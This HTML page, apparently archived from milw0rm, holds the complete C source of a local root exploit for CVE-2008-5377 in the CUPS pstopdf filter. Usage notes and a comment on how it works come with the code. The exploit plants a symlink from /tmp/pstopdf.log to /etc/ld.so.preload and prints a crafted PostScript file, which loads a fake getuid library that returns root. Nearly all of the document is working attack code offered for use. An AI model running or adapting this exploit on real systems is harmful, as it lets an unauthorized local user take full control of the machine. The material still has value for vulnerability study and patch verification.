<html><head><title>CUPS < 1.3.8-4 (pstopdf filter) Privilege Escalation Exploit</title></head><pre>/*
 * cve-2008-5377.c
 *
 * CUPS &lt; 1.3.8-4 pstopdf filter exploit
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 * http://jon.oberheide.org
 * 
 * Usage:
 *
 *   $ gcc cve-2008-5377.c -o cve-2008-5377.c
 *   $ ./cve-2008-5377
 *   $ id
 *   uid=0(root) gid=1000(vm) ...
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-5377
 *
 *   pstopdf in CUPS 1.3.8 allows local users to overwrite arbitrary files via
 *   a symlink attack on the /tmp/pstopdf.log temporary file.
 *
 * Operation:
 *
 *   The exploit creates and prints a malformed postscript document that will
 *   cause the CUPS pstopdf filter to write an error message out to its log 
 *   file that contains the string /tmp/getuid.so.  However, since we also 
 *   symlink the pstopdf log file /tmp/pstopdf.log to /etc/ld.so.preload, the 
 *   error message and malicious shared library path will be appended to the
 *   ld.so.preload file, allowing us to elevate privileges to root.
 *
 * Note:
 * 
 *   This exploit only works under the (rare) conditions that cupsd executes 
 *   external filters as a privileged user, a printer on the system uses the 
 *   pstopdf filter (e.g. the pdf.ppd PDF converter). Also, /etc/ld.so.preload
 *   must be world readable.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;strings.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/wait.h&gt;

int
main(void)
{
	int ret;
	FILE *fp;
	struct stat log;

	fp = fopen(&quot;/tmp/cve-2008-5377.ps&quot;, &quot;w&quot;);
	if(!fp) {
		printf(&quot;error: cannot open /tmp/cve-2008-5377.ps\n&quot;);
		goto cleanup;
	}
	fprintf(fp, &quot;%%!PS-Adobe-2.0 EPSF-2.0\n( /tmp/getuid.so ) CVE-2008-5377\n&quot;);
	fclose(fp);

	fp = fopen(&quot;/tmp/getuid.c&quot;, &quot;w&quot;);
	if(!fp) {
		printf(&quot;error: cannot open /tmp/getuid.c\n&quot;);
		goto cleanup;
	}
	fprintf(fp, &quot;int getuid(){return 0;}\n&quot;);
	fclose(fp);

	ret = system(&quot;cc -shared /tmp/getuid.c -o /tmp/getuid.so&quot;);
	if (WEXITSTATUS(ret) != 0) {
		printf(&quot;error: cannot compile /tmp/getuid.c\n&quot;);
		goto cleanup;
	}

	unlink(&quot;/tmp/pstopdf.log&quot;);
	ret = stat(&quot;/tmp/pstopdf.log&quot;, &amp;log);
	if (ret != -1) {
		
		printf(&quot;error: /tmp/pstopdf.log already exists\n&quot;);
		goto cleanup;
	}

	ret = symlink(&quot;/etc/ld.so.preload&quot;, &quot;/tmp/pstopdf.log&quot;);
	if (ret == -1) {
		printf(&quot;error: cannot symlink /tmp/pstopdf.log to /etc/ld.so.preload\n&quot;);
		goto cleanup;
	}

	ret = system(&quot;lp &lt; /tmp/cve-2008-5377.ps&quot;);
	if (WEXITSTATUS(ret) != 0) {
		printf(&quot;error: could not print /tmp/cve-2008-5377.ps\n&quot;);
		goto cleanup;
	}

cleanup:
	unlink(&quot;/tmp/cve-2008-5377.ps&quot;);
	unlink(&quot;/tmp/getuid.c&quot;);
	return 0;
} 

// milw0rm.com [2008-12-22]</pre></html>